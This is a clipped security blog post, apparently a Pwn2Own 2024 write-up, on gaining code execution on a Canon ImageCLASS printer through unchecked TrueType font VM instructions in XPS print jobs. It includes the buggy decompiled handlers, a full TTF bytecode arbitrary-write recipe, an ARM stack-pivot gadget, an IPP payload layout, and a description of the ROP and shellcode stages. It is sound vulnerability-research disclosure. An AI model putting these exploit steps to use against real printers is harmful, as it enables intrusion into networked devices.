---
title: Hacking printers using fonts
source: https://haxx.in/posts/2025-09-23-canon-ttf/
source_host: haxx.in
clip_date: 2026-09-29T10:12:50+08:00
trace_id: 133784eb-9c8c-48da-b5cd-c8c5c1fa345f
content_hash: 8304c79b5b15e2dae3a2d38cecdedb82195d0f505af17079ffad49be2a99ea55
status: synced
tags:
  - 漏洞分析
  - 协议分析
series: null
feed_source: haxx.in·固件逆向
ai_summary: PHP HOOLIGANS 利用 Canon ImageCLASS 的 XPS/TTF 字体虚拟机漏洞，在 Pwn2Own 2024 实现打印机远程代码执行。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ea75244-d011-8162-b30d-ed1d19a1a9ac
ioc:
  cves: []
  cwes: []
  hashes:
    - be4388a5bc0b449cb1d63bd8159d2402
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> PHP HOOLIGANS 利用 Canon ImageCLASS 的 XPS/TTF 字体虚拟机漏洞，在 Pwn2Own 2024 实现打印机远程代码执行。
> 
> - **攻击入口：** 通过 PJL `@PJL ENTER LANGUAGE = XPS` 让打印机解析 XPS；XPS 是 ZIP 内 XML 与资源，页面 `Glyphs` 的 `FontUri` 会加载 TTF，进入字体解析代码。
> - **漏洞根因：** Canon TTF VM 实现缺少栈边界检查；`CINDEX` 可按索引越界读 VM 栈，`DELTAP1` 可相对当前栈指针无检查迁移栈指针。
> - **利用原语：** 用 `CINDEX` 泄露 VM 栈地址，`DELTAP1` 按 8 字节步长迁移栈，结合 26.6 定点 `MUL` 构造任意 32 位值，再以 `WS`/`RS` 存取值，形成任意 32 位写。
> - **控制流劫持：** 覆盖 IPP 属性处理回调相关函数指针，借 IPP 请求数据触发现有栈迁移指令；ROP 链放在 BJNP 会话缓冲区。
> - **绕过与载荷：** ROP 修改页表禁用 NX、清 D-cache、失效 TLB；最终 shellcode 关闭看门狗，连接硬编码 IP+端口，读取 socket 数据写入 framebuffer。

## Hacking printers using fonts

## Introduction

Last year we (PHP HOOLIGANS) competed in Pwn2Own (ireland, 2024) once again. One of our (succesful) entries was against a little pet peeve target of mine, the CANON ImageCLASS printer. In this post I’ll walk you through the vulnerability I found and exploited.

## Attack surface exploration

In previous years I have (un)successfully exploited some relatively trivial to identify stack buffer overflow vulnerabilities on the CANON ImageCLASS printer. This year I wanted to go for something a bit less trivial so I started exploring my options. Printers (often) support a myriad of different fileformats and network protocols, but I wanted to touch on something that noone had attempted before (or at least, on CANON). While reversing the PJL (Printer Job Language) handling a bit I was reminded you can specify a “language” for your print job document using the `@PJL ENTER LANGUAGE = XXX` construct. While cruising the available job languages I stumbled upon one called “XPS”.

## XPS?

If we google for XPS and put some faith in the AI slop you get on top of your google results nowadays we are presented with this excerpt:

> An XPS file (XML Paper Specification) is a fixed-layout electronic document format created by Microsoft as an alternative to the PDF format, preserving the appearance of digital documents across different devices and printers. It contains text, images, vector graphics, and embedded fonts within a ZIP-compressed package based on XML markup, and can be viewed using the XPS Viewer in Windows or converted to a PDF.

So an XPS document is essentially a fileformat based around something that quacks a lot like XML + other asset files in a ZIP container.

Let’s start by examining a random XPS test file I found on the internet:

```bash
$ (mkdir u && cd u && unzip -d . ../template.xps >/dev/null) && find . -type f
./_rels/.rels
./_rels/FixedDocumentSequence.fdseq.rels
./[Content_Types].xml
./Documents/1/_rels/FixedDocument.fdoc.rels
./Documents/1/FixedDocument.fdoc
./Documents/1/Pages/_rels/1.fpage.rels
./Documents/1/Pages/_rels/2.fpage.rels
./Documents/1/Pages/_rels/3.fpage.rels
./Documents/1/Pages/1.fpage
./Documents/1/Pages/2.fpage
./Documents/1/Pages/3.fpage
./FixedDocumentSequence.fdseq
./package/services/digital-signature/_rels/origin.psdsor.rels
./package/services/digital-signature/certificate/1C6B644E0003008778A8.cer
./package/services/digital-signature/origin.psdsor
./package/services/digital-signature/xml-signature/_rels/be4388a5bc0b449cb1d63bd8159d2402.psdsxs.rels
./package/services/digital-signature/xml-signature/be4388a5bc0b449cb1d63bd8159d2402.psdsxs
./Resources/arial.ttf
./Resources/DocStructure_1.struct
./Resources/Document1_PT.xml
./Resources/Job_PT.xml
./Resources/QL_logo_color.tif
./xmls/xml_1.xaml
```

Without reading too much of any formal XPS specification, let’s try to make sense of it. In `FixedDocumentSequence.fdseq` we find the definition of a `FixedDocumentSequence` that has one or more `DocumentReference` nodes. These `DocumentReference` nodes contain a `Source` attribute with a path to the actual document.

```xml
<?xml version="1.0" encoding="utf-8"?>
<FixedDocumentSequence xmlns="http://schemas.microsoft.com/xps/2005/06">
  <DocumentReference Source="/Documents/1/FixedDocument.fdoc"/>
</FixedDocumentSequence>
```

If we have a look at `Documents/1/FixedDocument.fdoc` we can see the root node `FixedDocument` can have one or more `PageContent` child nodes. These `PageContent` nodes have a `Source` attribute again containing a path to the document that describes that particular page.

```xml
<?xml version="1.0" encoding="utf-8"?>
<FixedDocument xmlns="http://schemas.microsoft.com/xps/2005/06">
  <PageContent Source="/Documents/1/Pages/1.fpage">
    <PageContent.LinkTargets>
      <LinkTarget Name="Title"/>
      <LinkTarget Name="Page1"/>
      <LinkTarget Name="DocStruct"/>
      <LinkTarget Name="Outline"/>
      <LinkTarget Name="Ignored"/>
      <LinkTarget Name="LinkTargets"/>
      <LinkTarget Name="Arrows"/>
      <LinkTarget Name="No_Effect"/>
      <LinkTarget Name="PrintTickets"/>
      <LinkTarget Name="DocumentDuplex"/>
      <LinkTarget Name="JobCopiesAllDocuments"/>
      <LinkTarget Name="DigitalSignature"/>
    </PageContent.LinkTargets>
  </PageContent>
  <PageContent Source="/Documents/1/Pages/2.fpage">
    <PageContent.LinkTargets>
      <LinkTarget Name="Page2"/>
    </PageContent.LinkTargets>
  </PageContent>
  <PageContent Source="/Documents/1/Pages/3.fpage">
    <PageContent.LinkTargets>
      <LinkTarget Name="Page3"/>
    </PageContent.LinkTargets>
  </PageContent>
</FixedDocument>
```

Looking at one of these page document, `Documents/1/Pages/1.fpage`, we can see the actual contents that are rendered to a page contained in the `FixedPage` root node. In this example we can see some interesting primitives like a `Path` node containing an `ImageBrush` child node referencing a TIF image. Furthermore we can see `Glyphs` childnode that is used to render some text with a partciular style. Here we also see a `FontUri` attribute specifying the path to a TTF font.

```xml
<FixedPage Width="816" Height="1056" xml:lang="en-US" xmlns="http://schemas.microsoft.com/xps/2005/06">
    <Path RenderTransform=".7,0,0,.7,0,20" Data="M 30,20 l 258.24,0 0,56.64 -258.24,0 Z">
        <Path.Fill>
            <ImageBrush
              ImageSource="/Resources/QL_logo_color.tif"
              Viewbox="0,0,258.24,56.64"
              ViewboxUnits="Absolute"
              Viewport="50,20,193.68,42.48" ViewportUnits="Absolute" />
        </Path.Fill>
    </Path>
    <Glyphs
      Fill="#ff000000"
      FontUri="/Resources/arial.ttf"
      FontRenderingEmSize="12"
      OriginX="40" OriginY="1015"
      UnicodeString="Copyright &#xa9; 2006 QualityLogic, Inc." />
</FixedPage>
```

The existence of this `FontUri` thing made me realize that in order for the printer to correctly render a document it also needs some support code to render text in arbitrary fonts. I know from some prior experience that parsing font data is error prone and probably a good source for powerful bugs. So that’s what I decided to investigate!

## Anatomy of a TTF file

Let’s try to understand the format of a TTF file in the most caveman-esque way, by staring at some hex for the header of a TTF:

```hexdump
00000000: 0001 0000 0017 0100 0004 0070 4453 4947  ...........pDSIG
00000010: 243d f9e7 0003 eac0 0000 1a7c 4744 4546  $=.........|GDEF
00000020: 5e23 5d72 0003 e21c 0000 00a6 4753 5542  ^#]r........GSUB
00000030: 8fae 9f61 0003 e2c4 0000 07dc 4a53 5446  ...a........JSTF
00000040: 6d2a 6906 0003 eaa0 0000 001e 4c54 5348  m*i.........LTSH
00000050: 8065 fa3c 0000 1c78 0000 068e 4f53 2f32  .e.<...x....OS/2
00000060: 0cdf 326b 0000 01f8 0000 0056 5043 4c54  ..2k.......VPCLT
00000070: fd7b 3e43 0003 e1e4 0000 0036 5644 4d58  .{>C.......6VDMX
00000080: 5092 6af5 0000 2308 0000 1194 636d 6170  P.j...#.....cmap
00000090: 32da b7d6 0000 d1c4 0000 0b1c 6376 7420  2...........cvt
000000a0: 4ecc 3873 0000 e4f4 0001 0000 6670 676d  N.8s........fpgm
000000b0: 09c5 c400 0000 dce0 0000 0814 6761 7370  ............gasp
000000c0: 0018 0009 0003 e1d4 0000 0010 676c 7966  ............glyf
000000d0: 9d8f 00f9 0001 f20c 0001 7cfa 6864 6d78  ..........|.hdmx
000000e0: bebb c397 0000 349c 0000 9d28 6865 6164  ......4....(head
000000f0: f9a7 56c8 0000 017c 0000 0036 6868 6561  ..V....|...6hhea
00000100: 1233 12ff 0000 01b4 0000 0024 686d 7478  .3.........$hmtx
00000110: 0e34 5840 0000 0250 0000 1a28 6b65 726e  .4X@...P...(kern
00000120: 3761 3936 0003 6f08 0000 1560 6c6f 6361  7a96..o....`loca
00000130: 59a1 f43e 0001 e4f4 0000 0d16 6d61 7870  Y..>........maxp
00000140: 0933 4179 0000 01d8 0000 0020 6e61 6d65  .3Ay....... name
00000150: 47ee 16a0 0003 8468 0000 1b85 706f 7374  G......h....post
00000160: 1388 fde2 0003 9ff0 0000 41e2 7072 6570  ..........A.prep
00000170: 0000 0000 0000 e4f4 0000 0000 0001 0000  ................
```

hello my name is arial.ttf

The trained eye will spot some 4byte ASCII identifiers as well as various values that look like (big endian) offsets/sizes. A TTF file starts with a 12 byte header that is defined like this:

```c
struct ttf_header {
  uint32_t sfntVersion;
  uint16_t numTables;
  uint16_t searchRange;
  uint16_t entrySelector;
  uint16_t rangeShift;
};
```

Following this header is the ’table directory’. This directory has `numTables` entries of 16 bytes each, every entry is structured like this:

```c
struct ttf_table_entry {
  uint32_t tag;
  uint32_t checkSum;
  uint32_t offset;
  uint32_t length;
};
```

If we prettyprint the table directory for arial.ttf we see:

```bash
tag: b'DSIG', checksum: 243df9e7, offset: 00057f8c, length: 00001a7c
tag: b'GDEF', checksum: 5e235d72, offset: 00057518, length: 000000a6
tag: b'GSUB', checksum: d5f0ddcc, offset: 000575c0, length: 000009aa
tag: b'JSTF', checksum: 6d2a6906, offset: 00057f6c, length: 0000001e
tag: b'LTSH', checksum: 8065fa3c, offset: 00001c78, length: 0000068e
tag: b'OS/2', checksum: 0cdf326b, offset: 000001f8, length: 00000056
tag: b'PCLT', checksum: fd7b3e43, offset: 000574e0, length: 00000036
tag: b'VDMX', checksum: 50926af5, offset: 00002308, length: 00001194
tag: b'cmap', checksum: e7406a3a, offset: 0000d1c4, length: 0000176a
tag: b'cvt ', checksum: 962ad276, offset: 0000faa0, length: 00000630
tag: b'fpgm', checksum: cc79599a, offset: 0000e930, length: 0000066e
tag: b'gasp', checksum: 00180009, offset: 000574d0, length: 00000010
tag: b'glyf', checksum: 0ef78fec, offset: 00011afc, length: 0003e762
tag: b'hdmx', checksum: bebbc397, offset: 0000349c, length: 00009d28
tag: b'head', checksum: ce982692, offset: 0000017c, length: 00000036
tag: b'hhea', checksum: 123312ff, offset: 000001b4, length: 00000024
tag: b'hmtx', checksum: 0e345840, offset: 00000250, length: 00001a28
tag: b'kern', checksum: 37613936, offset: 00050260, length: 00001560
tag: b'loca', checksum: 0e616932, offset: 000100d0, length: 00001a2c
tag: b'maxp', checksum: 0b470ca8, offset: 000001d8, length: 00000020
tag: b'name', checksum: c0f2653b, offset: 000517c0, length: 00001b0d
tag: b'post', checksum: 8fe9d77e, offset: 000532d0, length: 000041ff
tag: b'prep', checksum: 52fec4e9, offset: 0000efa0, length: 00000aff
```

TTF supports quite a few different types of these tables, but since this is not an attempt at extensively documenting the TTF file format we will ignore most of them.:-)

One nifty thing about the TTF file format is it’s ability to contain definitions that ensure a pleasant (to the eyes) visual appearance at various scaling/sizing levels and between individual glyphs/letters (‘kerning’). The good news for us is that the way this is done is using small bytecode programs that run inside an interpreted virtual machine. One place where we find these bytecodes is inside the `fpgm` (“font program”) table. In the case of the bytecode program stored in the `fpgm` table, it’s only ran once when the font is first used. Typically it contains function definitions that are then invoked repeatedly when individual glyphs are rendered (using bytecode from the `prep` and `glyf` tables)

## TTF VM

The best reference I have found for the TTF virtual machine is kindly provided on the apple developer portal and can be found [here](https://developer.apple.com/fonts/TrueType-Reference-Manual/RM05/Chap5.html). (Which is no surprise, considering Apple came up with TTF in the first place:-))

A quick skimread of the page learns us there are quite a few instructions in this VM. Let’s break that down to a nice table.

|     |     |     |     |     |     |     |     |     |
| :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
|     | 0   | 1   | 2   | 3   | 4   | 5   | 6   | 7   |
| 00  | **SVTCA** | **SVTCA** | **SPVTCA** | **SPVTCA** | **SFVTCA** | **SFVTCA** | **SPVTL** | **SPVTL** |
| 08  | **SFVTL** | **SFVTL** | **SPVFS** | **SFVFS** | **GPV** | **GFV** | **SFVTPV** | **ISECT** |
| 10  | **SRP0** | **SRP1** | **SRP2** | **SZP0** | **SZP1** | **SZP2** | **SZPS** | **SLOOP** |
| 18  | **RTG** | **RTHG** | **SMD** | **ELSE** | **JMPR** | **SCVTCI** | **SSWCI** | **SSW** |
| 20  | **DUP** | **POP** | **CLEAR** | **SWAP** | **DEPTH** | **CINDEX** | **MINDEX** | **ALIGNPTS** |
| 28  | \-  | **UTP** | **LOOPCALL** | **CALL** | **FDEF** | **ENDF** | **MDAP** | **MDAP** |
| 30  | **IUP** | **IUP** | **SHP** | **SHP** | **SHC** | **SHC** | **SHZ** | **SHZ** |
| 38  | **SHPIX** | **IP** | **MSIRP** | **MSIRP** | **ALIGNRP** | **RTDG** | **MIAP** | **MIAP** |
| 40  | **NPUSHB** | **NPUSHW** | **WS** | **RS** | **WCVTP** | **RCVT** | **GC** | **GC** |
| 48  | **SCFS** | **MD** | **MD** | **MPPEM** | **MPS** | **FLIPON** | **FLIPOFF** | **DEBUG** |
| 50  | **LT** | **LTEQ** | **GT** | **GTEQ** | **EQ** | **NEQ** | **ODD** | **EVEN** |
| 58  | **IF** | **EIF** | **AND** | **OR** | **NOT** | **DELTAP1** | **SDB** | **SDS** |
| 60  | **ADD** | **SUB** | **DIV** | **MUL** | **ABS** | **NEG** | **FLOOR** | **CEILING** |
| 68  | **ROUND** | **ROUND** | **ROUND** | **ROUND** | **NROUND** | **NROUND** | **NROUND** | **NROUND** |
| 70  | **WCVTF** | **DELTAP2** | **DELTAP3** | **DELTAC1** | **DELTAC2** | **DELTAC3** | **SROUND** | **S45ROUND** |
| 78  | **JROT** | **JROF** | **ROFF** | \-  | **RUTG** | **RDTG** | **SANGW** | **AA** |
| 80  | **FLIPPT** | **FLIPRGON** | **FLIPRGOFF** | \-  | \-  | **SCANCTRL** | **SDPVTL** | **SDPVTL** |
| 88  | **GETINFO** | **IDEF** | **ROLL** | **MAX** | **MIN** | **SCANTYPE** | **INSTCTRL** | \-  |
| 90  | \-  | \-  | \-  | \-  | \-  | \-  | \-  | \-  |
| 98  | \-  | \-  | \-  | \-  | \-  | \-  | \-  | \-  |
| A0  | \-  | \-  | \-  | \-  | \-  | \-  | \-  | \-  |
| A8  | \-  | \-  | \-  | \-  | \-  | \-  | \-  | \-  |
| B0  | **PUSHB** | **PUSHB** | **PUSHB** | **PUSHB** | **PUSHB** | **PUSHB** | **PUSHB** | **PUSHB** |
| B8  | **PUSHW** | **PUSHW** | **PUSHW** | **PUSHW** | **PUSHW** | **PUSHW** | **PUSHW** | **PUSHW** |
| C0  | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** |
| C8  | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** |
| D0  | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** |
| D8  | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** | **MDRP** |
| E0  | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** |
| E8  | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** |
| F0  | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** |
| F8  | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** | **MIRP** |

Okay quite a menu to pick from and the overall complexity of some of these instructions was more than I bargained for. Let’s learn a bit more about how the VM operates first.

The TTF virtual machine is stack based. This means there are no dedicated “general purpose” registers. Anything a TTF VM program needs to preserve should be written to the VM stack. There’s a handful of instructions that will take their operands/arguments from the opcode byte stream but the majority of the instructions will pop their input from the stack and push any output back to the stack.

Every stack item is 32bits in size.

## CANON TTF bugz

So after (finally) identifying the codepath in the firmware where the TTF VM opcodes are dispatched I started reversing them a bit. What I found out soon was quite surprising/shocking. There are some attempts in the code to stop OOB read/write of the VM stack but many instructions don’t take the stack bounds into account!

Let’s look at some (powerful) examples of buggy instructions I identified:

### CINDEX - Copy the INDEXed element to the top of the stack

CINDEX will pop an index from the stack and use this value as an offset into the stack, read the value from there and push this value back to the stack.

Let’s have a look at CANON’s implementation:

```c
int32_t *ttf_op_cindex(ttf_vm_ctx *ctx)
{
  int32_t *stack_cur;
  int32_t *result;
  int value;

  stack_cur = ctx->stack_cur;
  value = *(stack_cur - 1);
  result = stack_cur - 1;
  *result = result[-v3];
  return result;
}
```

It doesn’t take a big brain to spot this instructions’ implementation is entirely absent of VM stack bound checks. So this gives us our first primitive, a VM-stack-relative read.

What we really also need is a write though. We can easily trigger writes by for example invoking a push instruction or any other instruction that writes to the VM stack. but those writes will always go to the VM stack, unless we can somehow pivot the VM stack to an arbitrary location?

After quite an extensive reversing and annotation session I ran accross the `DELTAP1` instruction. If we look at the inner handler for the `DELTAP` family of instructions we find this:

```c
void ttf_op_deltap(ttf_vm_ctx *ctx, int arg2, int arg3, int32_t *stack_cur)
{
  int32_t *stack_new;
  ttf_vm_state *state;

  /* ------ 8< -------  */

  stack_new = ctx->stack_cur - 1;
  ctx->stack_cur = stack_new;
  argn = 2 * *stack_new;
  ctx->stack_cur = &stack_new[-2 * *stack_new];
  state = ctx->state;

  /* ------ 8< -------  */
}
```

What’s happening here? the TTF VM stack is being pivoted relative to the current stack pointer. Again without any bounds checking! We could use this bug to pivot the VM’s stack to an arbitrary location relative to it’s current location. If we follow that up with a stack write we’ll have our arbitrary write primitive. Some things to consider and address though:

-   since the pivot is *relative* we’ll need to know where our current VM stack resides to point it anywhere meaningful.
-   we can only pivot in increments of 8 bytes relative to the current stack pointer, not that big of a deal.

## Performing basic arithmetic

The TTF vm’s stack are signed 32bit values. However, the instructionset provides no easy/clean way to put arbitrary 32bit numbers on the stack. Most arithmetic operations take in 16bit signed numbers as arguments. This is problematic as this means we can’t easily get arbitrary consecutive values on the VM stack without holes in it.

I built a small emulated harness that would let me easily try out arbitrary bytecode in a fresh VM instance and inspect the stack/state of the VM.

Let’s start simple, let’s push a single byte to the VM stack. The `PUSHB` opcode is `0xb0` till `0xb7`. the variants of the opcode allow you to push multiple bytes (up to 8 at a time). `0xb0` means push 1 byte, `0xb1` means push 2 bytes, etc.

Input Assembly

```c
PUSHB2 0xaa 0xbb
```

VM stack after running:

```awk
aa 00 00 00  bb 00 00 00  00 00 00 00  00 00 00 00
```

We can see 0xAA and 0xBB being written to the stack. Let’s try the same but this time using the `PUSHW` (Push WORD) opcode (`0xB8-0xBF`). This writes 16bit values rather than 8bit.

Input Assembly

```c
PUSHW2 0x1122 0xaabb
```

VM stack after running:

```awk
22 11 00 00  bb aa ff ff  00 00 00 00  00 00 00 00
```

We can see `0x1122` was written as-is, but since `0xAABB` has the MSB of the 16bit word set it sign-extended to `0xFFFFAABB`.

Let’s ignore the sign-extension thing for now and try to write *any* 32bit value to the stack. let’s try `0x11223344`.

We would have to push two 16bit WORDs, shift one of them 16 bits to the left somehow and combine them using `AND` / `OR` or something. There is no plain shift instruction though. What we do have though is a `MUL` (multiply) instruction, it comes with a caveat though..

If we look at the documentation for `MUL` we see:

> Multiplies the top two numbers on the stack. Pops two 26.6 numbers, n2 and n1, from the stack and pushes onto the stack the product of the two elements. The 52.12 result is shifted right by 6 bits and the high 26 bits are discarded yielding a 26.6 result.

So the multiplication works on 26.6 (26+6=32) fixed point integers. We can treat this as a regular multiplication but we have to take into account the “The 52.12 result is shifted right by 6 bits” part. Let me demonstrate:

Input Assembly

```c
PUSHW2 0x4 0x4
MUL
```

VM stack after running:

```awk
00 00 00 00  04 00 00 00  00 00 00 00  00 00 00 00
```

Here we tried to multiply 0x0004 by 0x0004 and got zero. but if we account for the shift right of 6 bits by doing 0x4 MUL (0x4*64) instead we get the expected outcome of 0x10:

Input Assembly

```c
PUSHW2 0x4 0x100
MUL
```

VM stack after running:

```awk
10 00 00 00  00 01 00 00  00 00 00 00  00 00 00 00
```

Let’s continue trying to build a consequtive 32bit value.

Input Assembly

```c
PUSHW3 0x1122 0x4000 0x4000
MUL
MUL
```

VM stack after running:

```awk
00 00 22 11  00 00 40 00  00 40 00 00  00 00 00 00
```

Cool, so by doing two MULs with a multiplier of 0x4000 we can effectively shift a stack value left by 16 bits and control the upper word of a stack entry.

Input Assembly

```c
PUSHW4 0x3344 0x1122 0x4000 0x4000
MUL
MUL
ADD
```

VM stack after running:

```awk
44 33 22 11  00 00 22 11  00 00 40 00  00 40 00 00
```

Okay, easy; arbitrary 32bit values! Well, not so fast actually:

Input Assembly

```c
PUSHW4 0xccdd 0xaabb 0x4000 0x4000
MUL
MUL
ADD
```

VM stack after running:

```awk
dd cc ba aa  00 00 bb aa  00 00 40 00  00 40 00 00
```

`0xaabbccdd != 0xaabaccdd`.:-( Remember the sign-extension I mentioned?

since we `ADD` the lower 16bit of our target value, this means we can’t have the MSB of our lower 16 bit value set. For the upper 16bit word it doesn’t matter since the sign-extended bits are truncated by the multiplication operation.

But it can easily be accounted for by simply adding 0x10000 to the result. We only do this if the MSB of the lower 16bit of our target value is set, of course:

Input Assembly

```c
PUSHW4 0xccdd 0xaabb 0x4000 0x4000
MUL
MUL
ADD
PUSHW2 0x1000 0x400
MUL
ADD
```

VM stack after running:

```awk
dd cc bb aa  00 00 01 00  00 04 00 00  00 40 00 00
```

## Pivoting the VM stack

So we have our pivot gadget (`DELTAP1`). One problem is that it’s a relative pivot, which is not too useful without knowing where our TTF VM stack lives in memory (and it’s heap allocated, hence ~unpredictable, of course). So let’s first try to use the infoleak bug we found in `CINDEX` to derive the address of the TTF VM stack.

By reading OOB with CINDEX starting at -1, then -2, etc. I was able to find a (relative) pointer to the TTF VM stack. After subtracting a fixed amount we are left with the original VM stack top pointer.

Input Assembly

```c
PUSHW1 0x9d
CINDEX
PUSHW1 0x1938
SUB
```

VM stack after running:

```awk
de fa dd ba  38 19 00 00  00 00 00 00  00 00 00 00
```

In this example 0x9d is the OOB index for CINDEX to reach the relative pointer to the TTF VM stack and we subtract 0x1938 to get the actual value (`0xbad13370` is the TTF VM stack top in our harness).

By subtracting the target stack pointer we want to pivot to from this value and dividing the result by 8 we can come up with a stack index that lets us pivot precisely where we want to using `DELTAP1`.

## After Pivoting the VM stack

Soo.. we just pivot the VM stack to some interesing (OOB) location and do some writes to get PC control, right? Well, the problem is that after pivot’ing the VM stack to somewhere interesting you’ll have to push new values on the stack to construct your target value. this has the downside of messing up more surrounding memory than you probably intended.

So ideally what we’d need is a instruction that executes a specific 32bit write without requiring any arguments from the stack. We’d execute this instruction right after pivot’ing the VM stack to get our controlled write. Sounds like a privileged/luxurious thing to ask for, I know. Luckily for us something like this exists though.. “storage”!

the TTF VM has another type of memory next to the stack called “storage”. Storage is an indexed array of 32bit integers that can be read using the `RS` instruction and written to using the `WS` instruction.

We can leverage this functionality to stash the value for our arbitrary-write and then after pivot’ing the vm stack we can read from this storage again to execute the write.

The final recipe for our arbitrary 32bit write is this:

```c
# storage index argument
PUSHB1 0
# push 0x11223344 onto the stack
PUSHW4 0x3344 0x1122 0x4000 0x4000
MUL
MUL
ADD
# write_storage(0, 0x11223344)
WS

# leak stack base
PUSHW1 0x9d
CINDEX
PUSHW1 0x1938
SUB

# put target addr on the stack
PUSHW4 0x6688 0x4455 0x4000 0x4000
MUL
MUL
ADD

# this clears some flag which makes the following `SUB` instruction not
# enter into some error path that halts the VM. don't ask me what it was
# exactly as I'm bad at keeping notes and wrote this retroactively. :-/
PUSHB1 0x0
SDS

# subtract target addr from stack base
SUB

# divide our 26p64 fixed point number by 512 to get an integer division of 8
PUSHW1 512
DIV

# pivot the VM stack to our target addr (0x44556688)
DELTAP1

# write our stored value (0x11223344) to the target addr by reading it from storage
PUSHB1 0
RS
```

## Where to write?

With all those mental gymnastics out of the way and our arbitrary 32bit write in the pocket, what do we overwrite? We can hijack a function pointer in some writable memory region, but due to W^X (which CANON nowadays does configure, this was not always the case;-)) we can’t just jump to our shellcode. We can’t easily start a traditional ROP chain either, unless we control the data that is on the stack at the time our hijacked function is called. So let’s find something we can overwrite *and* trigger with controlled stack contents somehow.

I’ll spare you the frustrating and boring tale of combing through various surfaces that accept user input that possibly-maybe-or-not-quite ends up on the stack *and* which can potentially be reached by overwriting a function pointer at a known and writable location.

Instead, let’s dissect the method I found. We’ll piggyback on some code flow that is part of CANON’s IPP stack. IPP is another printing protocol implemented on top of a HTTP transport. Typically IPP requests are HTTP POST requests with a `Content-Type` value of `application/ipp` and a `POST` body containing the IPP request data.

IPP requests starts with a list of (binary encoded) attributes, followed by an “end of attributes” tag. optionally this is followed by document data.

IPP attribute requests are dispatched through some lookup table that contains handler callbacks for every attribute. The callbacks get a pointer to the attribute request itself as their first argument. So if we find a stack pivot gadget that pivots to something based of whatever `R0` points to we should be good.

I found the following stack pivot sequence:

```gas
MOV       SP, R0             ; SP = R0
LDR       R0, [SP,#0x34]     ; R0 = *(SP+0x34)
LDR.W     LR, [SP,#0x38]     ; LR = *(SP+0x38)
LDR       R3, [SP,#0x3C]     ; R3 = *(SP+0x3C)
POP.W     {R2}               ; R2 = *SP++
STMDB.W   R0!, {R2,R3}       ; *(R0 + 0) = R2
                             ; *(R0 + 4) = R3
                             ; R0 += 8
LDMFD.W   SP, {R1-R12}       ; pop r1-r12 from SP
MOV       SP, R0             ; SP = R0
POP       {R0,PC}            ; pop r0, pc ..
```

this means if we lay out our IPP request data like this:

```hexdump
0000: FFFF FFFF FFFF FFFF FFFF 0000 0000 0000
0010: 0000 0000 0000 0000 0000 0000 0000 0000
0020: 0000 0000 0000 0000 0000 0000 0000 0000
0030: 0000 0000 1111 1111 2222 2222 3333 3333
```

(\*values marked \`FF\` cant be controlled by our IPP request)

`R0` will get loaded with `0x11111111`, `LR` with `0x22222222` and `R3` with `0x33333333`. Some values will get written to the memory R0 now points to, some registers will get popped and eventually the `SP` will be reset to the value of `R0` again (which now contains `0x11111111+8`). This gives us a relatively clean arbitrary stack pivot!

We will store our ROP chain at a fixed location in the address space by (once again, literally everyone and their cat writing CANON exploits does this:-)) relying on the BJNP session buffer.

The first order of business is to transition from ROP to arbitrary code execution. The folks over at Neodyme [recently published](https://neodyme.io/en/blog/pwn2own-2024_canon_rce/#exif-format-introduction) a nice CANON exploit writeup as well, in which they completely neuter the memory protections by ROP’ing into some existing code that overwrites the nescessary DACR (Domain Access Control Register) bits. I wasn’t so clever to realize the same approach when I was working on this, so I painstakingly identified the correct pagetable entry for the memory page holding the BJNP session data and had my ROP chain patch the pagetable entry to disable the NX bit. This worked.. sometimes, but often it would crash when jumping to my shellcode afterwards. This was solved by adding some more ROP that flushes the D-cache so my writes were commited back to DRAM and for good measure I also added some ROP to invalidate the TLB.

The downside of doing all this housekeeping in pure ROP is that it left little space for actual shellcode inside the BJNP session buffer. But I managed!

The final shellcode starts by disabling the watchdog and then does a TCP connect() to an hardcoded IP+port and reads data in a loop from the socket and writes it to the framebuffer.

## Showtime

For once the pwn2own-draw-order gods were on our side and we were up first for the CANON printer on day #1. We sent our youngest team member to Ireland all by himself, armed with a bag full of exploits (I was attending SAScon at the time).

Luckily, everything worked smoothly on the first try! Below you can find a small ambiance impression of the attempt:

## Closing notes

Another year, another writeup. I hope you liked it. I always strive to do more than *one* blogpost a year, but eh, it’s hard.
